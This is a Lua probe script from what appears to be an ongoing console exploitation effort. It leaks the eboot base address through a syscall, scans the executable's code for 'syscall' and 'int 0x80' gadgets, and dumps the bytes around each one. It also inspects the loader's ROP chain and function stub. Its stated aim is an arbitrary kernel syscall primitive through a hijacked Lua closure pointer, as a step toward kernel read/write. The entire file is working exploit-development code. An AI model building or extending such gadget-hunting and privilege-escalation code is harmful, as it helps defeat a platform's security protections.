-- CRASH_CLASS: LOW
-- PROBE 118a: Eboot syscall instruction scanner + dispatch analysis
--
-- Context: 56d/117a show CClosure +0x20 redirect executes eboot gadgets.
-- If we can find a "syscall" instruction (0F 05) in eboot's RX .text,
-- and understand the argument setup pattern around it, we can potentially
-- redirect to a function that makes an arbitrary kernel syscall.
--
-- THIS IS THE PATH TO KERNEL R/W:
--   1. Find "syscall; ret" (0F 05 C3) or "syscall; <cleanup>; ret"
--   2. Find argument setup: what sets rax (syscall #), rdi..r9 (args)?
--   3. Can we reach a useful sequence via CClosure redirect?
--   4. If yes: redirect + Lua stack args → arbitrary syscall
--
-- Section A: Scan first 4MB of eboot for all "syscall" instructions (0F 05)
-- Section B: For each found syscall, dump surrounding ±64 bytes
-- Section C: Look for the make_syscall dispatch function (it MUST use 0F 05)
-- Section D: Look for direct-call patterns (xor eax,eax + syscall, etc.)
-- Section E: Find "int 0x80" (CD 80) as well — FreeBSD supports both

print("=== PROBE 118a: EBOOT SYSCALL SCANNER ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

collectgarbage("stop")

-- Get eboot base
local function get_eboot_base()
    local info = memory.alloc(0x200)
    memory.write_dword(info, 0x160)
    local sc_info = make_syscall(593)
    pcall(function() sc_info(uint64(0), info) end)
    local lo = safe_rd(info + 0x108)
    local hi = safe_rd(info + 0x10C)
    if lo and hi then
        return uint64(string.format("0x%X%08X", hi, lo)), hi, lo
    end
    return nil, 0, 0
end

local eboot_base, eboot_hi, eboot_lo = get_eboot_base()
print("[*] eboot base: " .. fmt_addr(eboot_base))

if not eboot_base then
    print("ABORT: no eboot base")
    return
end

-- Also check eboot .text size from dynlib_get_info
local info2 = memory.alloc(0x200)
memory.write_dword(info2, 0x160)
local sc_info2 = make_syscall(593)
pcall(function() sc_info2(uint64(0), info2) end)
local text_size_lo = safe_rd(info2 + 0x110)
local text_size_hi = safe_rd(info2 + 0x114)
local text_size = text_size_lo or 0
print(string.format("[*] eboot .text size: 0x%X (%d KB)", text_size, text_size / 1024))


-- ================================================================
-- SECTION A: Scan for "syscall" instruction (0F 05)
-- ================================================================
print("")
print("--- SECTION A: Scan for 0F 05 (syscall) ---")
print("")

local syscall_locs = {}
local scan_limit = math.min(text_size, 0x400000)  -- cap at 4MB

-- Scan by dword, check every byte pair
local scan_count = 0
for off = 0, scan_limit - 4, 4 do
    local addr = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + off))
    local dw = safe_rd(addr)
    if dw then
        -- Extract all 4 bytes
        local b0 = dw % 256
        local b1 = math.floor(dw / 256) % 256
        local b2 = math.floor(dw / 65536) % 256
        local b3 = math.floor(dw / 16777216) % 256

        -- Check consecutive byte pairs for 0F 05
        if b0 == 0x0F and b1 == 0x05 then
            table.insert(syscall_locs, off)
        end
        if b1 == 0x0F and b2 == 0x05 then
            table.insert(syscall_locs, off + 1)
        end
        if b2 == 0x0F and b3 == 0x05 then
            table.insert(syscall_locs, off + 2)
        end
    end

    scan_count = scan_count + 1
    if scan_count % 100000 == 0 then
        print(string.format("  scanned %dK dwords, found %d syscalls so far...",
            scan_count / 1000, #syscall_locs))
    end
end

-- Check cross-dword boundary (byte 3 of dword N + byte 0 of dword N+4)
for off = 0, scan_limit - 8, 4 do
    local addr1 = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + off))
    local addr2 = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + off + 4))
    local dw1 = safe_rd(addr1)
    local dw2 = safe_rd(addr2)
    if dw1 and dw2 then
        local b3 = math.floor(dw1 / 16777216) % 256
        local b4 = dw2 % 256
        if b3 == 0x0F and b4 == 0x05 then
            local found = false
            for _, loc in ipairs(syscall_locs) do
                if loc == off + 3 then found = true break end
            end
            if not found then
                table.insert(syscall_locs, off + 3)
            end
        end
    end
end

table.sort(syscall_locs)

print(string.format("\n[A] TOTAL: %d syscall instructions found in eboot", #syscall_locs))

for i, off in ipairs(syscall_locs) do
    print(string.format("  [%d] eboot+0x%06X", i, off))
end


-- ================================================================
-- SECTION B: Dump ±32 bytes around each syscall instruction
-- ================================================================
print("")
print("--- SECTION B: Context around each syscall ---")
print("")

for i, off in ipairs(syscall_locs) do
    if i > 30 then
        print(string.format("  [%d+] ... %d more (truncated)", i, #syscall_locs - i + 1))
        break
    end

    print(string.format("[B-%d] syscall at eboot+0x%06X:", i, off))

    -- Dump -32 to +16 bytes (focus on setup before syscall)
    local start_off = off - 32
    if start_off < 0 then start_off = 0 end
    local end_off = off + 16

    local bytes_str = "  "
    for boff = start_off, end_off - 1 do
        local dw_off = boff - (boff % 4)
        local byte_pos = boff % 4
        local addr = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + dw_off))
        local dw = safe_rd(addr)
        if dw then
            local b
            if byte_pos == 0 then b = dw % 256
            elseif byte_pos == 1 then b = math.floor(dw / 256) % 256
            elseif byte_pos == 2 then b = math.floor(dw / 65536) % 256
            else b = math.floor(dw / 16777216) % 256 end

            if boff == off then
                bytes_str = bytes_str .. string.format("[%02X", b)
            elseif boff == off + 1 then
                bytes_str = bytes_str .. string.format(" %02X]", b)
            else
                bytes_str = bytes_str .. string.format(" %02X", b)
            end
        else
            bytes_str = bytes_str .. " ??"
        end
    end
    print(bytes_str)

    -- Key pattern analysis:
    -- Check if byte after 0F 05 is C3 (ret) → "syscall; ret" pattern
    local after_off = off + 2
    local after_dw_off = after_off - (after_off % 4)
    local after_byte_pos = after_off % 4
    local after_addr = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + after_dw_off))
    local after_dw = safe_rd(after_addr)
    if after_dw then
        local after_byte
        if after_byte_pos == 0 then after_byte = after_dw % 256
        elseif after_byte_pos == 1 then after_byte = math.floor(after_dw / 256) % 256
        elseif after_byte_pos == 2 then after_byte = math.floor(after_dw / 65536) % 256
        else after_byte = math.floor(after_dw / 16777216) % 256 end

        if after_byte == 0xC3 then
            print("  *** PATTERN: syscall; ret — IDEAL GADGET ***")
        elseif after_byte == 0x48 or after_byte == 0x41 then
            print("  (post-syscall: likely register operation)")
        elseif after_byte == 0x0F then
            print("  (post-syscall: 0F prefix — may be jcc)")
        end
    end

    -- Check for "mov rax, N" or "mov eax, N" before the syscall
    -- mov rax, imm32 = 48 C7 C0 XX XX XX XX (7 bytes before)
    -- mov eax, imm32 = B8 XX XX XX XX (5 bytes before)
    local pre5_off = off - 5
    if pre5_off >= 0 then
        local pre_dw_off = pre5_off - (pre5_off % 4)
        local pre_byte_pos = pre5_off % 4
        local pre_addr = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + pre_dw_off))
        local pre_dw = safe_rd(pre_addr)
        if pre_dw then
            local pre_byte
            if pre_byte_pos == 0 then pre_byte = pre_dw % 256
            elseif pre_byte_pos == 1 then pre_byte = math.floor(pre_dw / 256) % 256
            elseif pre_byte_pos == 2 then pre_byte = math.floor(pre_dw / 65536) % 256
            else pre_byte = math.floor(pre_dw / 16777216) % 256 end

            if pre_byte == 0xB8 then
                -- Read the 4-byte immediate
                local imm_off = pre5_off + 1
                local imm_dw_off = imm_off - (imm_off % 4)
                local imm_addr = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + imm_dw_off))
                local imm_dw = safe_rd(imm_addr)
                if imm_dw then
                    -- Extract 4 bytes starting at imm_off
                    -- (simplified: just show the dword and note it)
                    print(string.format("  *** PATTERN: mov eax, 0x?? ; syscall ***"))
                end
            end
        end
    end

    print("")
end


-- ================================================================
-- SECTION C: Scan for "int 0x80" (CD 80) — older FreeBSD ABI
-- ================================================================
print("--- SECTION C: Scan for CD 80 (int 0x80) ---")
print("")

local int80_count = 0
for off = 0, scan_limit - 4, 4 do
    local addr = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + off))
    local dw = safe_rd(addr)
    if dw then
        local b0 = dw % 256
        local b1 = math.floor(dw / 256) % 256
        local b2 = math.floor(dw / 65536) % 256
        local b3 = math.floor(dw / 16777216) % 256

        if b0 == 0xCD and b1 == 0x80 then
            print(string.format("  int 0x80 at eboot+0x%06X", off))
            int80_count = int80_count + 1
        end
        if b1 == 0xCD and b2 == 0x80 then
            print(string.format("  int 0x80 at eboot+0x%06X", off + 1))
            int80_count = int80_count + 1
        end
        if b2 == 0xCD and b3 == 0x80 then
            print(string.format("  int 0x80 at eboot+0x%06X", off + 2))
            int80_count = int80_count + 1
        end
    end
end
print(string.format("[C] TOTAL: %d int 0x80 instructions", int80_count))


-- ================================================================
-- SECTION D: Look for the loader's syscall dispatch
-- ================================================================
print("")
print("--- SECTION D: Loader dispatch analysis ---")
print("")

-- The loader calls syscalls when we do make_syscall(N)(args).
-- It must have a "syscall" instruction somewhere in eboot.
-- The dispatch likely does:
--   1. Read syscall_no from the pipe object
--   2. Move it to rax
--   3. Set up rdi..r9 from the arguments
--   4. Execute "syscall"
--   5. Return result
--
-- We know tostring(syscall.pipe) gives "ropchain @ ..." and "fcall_stub.fn_addr: ..."
-- Let's parse those to find the dispatch area.

local pipe_str = tostring(syscall.pipe)
print("[D] pipe tostring: " .. (pipe_str or "nil"))

local rop_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
print("[D] ropchain: " .. (rop_str or "nil"))
print("[D] fn_addr:  " .. (fn_str or "nil"))

-- If fn_addr points into eboot, dump the function there
if fn_str then
    local fn_val = uint64(fn_str)
    local fh, fl = get_hi_lo(fn_val)
    local fn_off = fl - eboot_lo
    if fh == eboot_hi and fn_off >= 0 and fn_off < text_size then
        print(string.format("[D] fn_addr is eboot+0x%X — in .text!", fn_off))
        print("[D] Dumping 128 bytes at fn_addr:")
        for doff = 0, 124, 4 do
            local addr = uint64(string.format("0x%X%08X", fh, fl + doff))
            local dw = safe_rd(addr)
            if dw then
                local b0 = dw % 256
                local b1 = math.floor(dw / 256) % 256
                local b2 = math.floor(dw / 65536) % 256
                local b3 = math.floor(dw / 16777216) % 256
                print(string.format("  +0x%02X: %02X %02X %02X %02X", doff, b0, b1, b2, b3))
                -- Check for syscall instruction in this range
                if (b0 == 0x0F and b1 == 0x05) or
                   (b1 == 0x0F and b2 == 0x05) or
                   (b2 == 0x0F and b3 == 0x05) then
                    print("        ^^^ SYSCALL INSTRUCTION HERE ^^^")
                end
            end
        end
    else
        print("[D] fn_addr is NOT in eboot .text")
        print(string.format("[D]   fn_off=0x%X, eboot_hi=0x%X, fh=0x%X", fn_off, eboot_hi, fh))
    end
end

-- Also check ropchain address
if rop_str then
    local rop_val = uint64(rop_str)
    local rh, rl = get_hi_lo(rop_val)
    local rop_off = rl - eboot_lo
    if rh == eboot_hi and rop_off >= 0 and rop_off < text_size then
        print(string.format("\n[D] ropchain is eboot+0x%X — in .text!", rop_off))
    else
        print(string.format("\n[D] ropchain at %s (NOT in eboot .text)", rop_str))
        -- Check if it's on the heap (where we can read/write)
        local rop_dw = safe_rd(rop_val)
        if rop_dw then
            print("[D] ropchain IS readable! Dumping first 128 bytes:")
            for doff = 0, 124, 8 do
                local qval = safe_rq(rop_val + doff)
                if qval then
                    local qh, ql = get_hi_lo(qval)
                    -- Check if this qword looks like an eboot address
                    local is_eboot = (qh == eboot_hi and ql >= eboot_lo and ql < eboot_lo + text_size)
                    print(string.format("  +0x%02X: 0x%08X_%08X%s",
                        doff, qh, ql,
                        is_eboot and string.format(" (eboot+0x%X)", ql - eboot_lo) or ""))
                end
            end
        else
            print("[D] ropchain NOT readable")
        end
    end
end


-- ================================================================
-- SECTION E: Summary and exploitation path
-- ================================================================
print("")
print("--- SECTION E: Summary ---")
print(string.format("[E] Total syscall (0F 05): %d", #syscall_locs))
print(string.format("[E] Total int 0x80 (CD 80): %d", int80_count))

if #syscall_locs > 0 then
    print("[E] The loader MUST call one of these. If we can identify which")
    print("[E] one is the dispatch, and find a way to control rax before it,")
    print("[E] we have an arbitrary syscall primitive via CClosure redirect.")
    print("[E]")
    print("[E] Path: redirect +0x20 → pop rax;ret → rax=syscall_no → ???")
    print("[E] OR: redirect +0x20 → function that does mov rax, [rdi+off]; syscall")
    print("[E] where rdi=lua_State and we control the stack value at that offset.")
end

print("")
print("=== PROBE 118a COMPLETE ===")
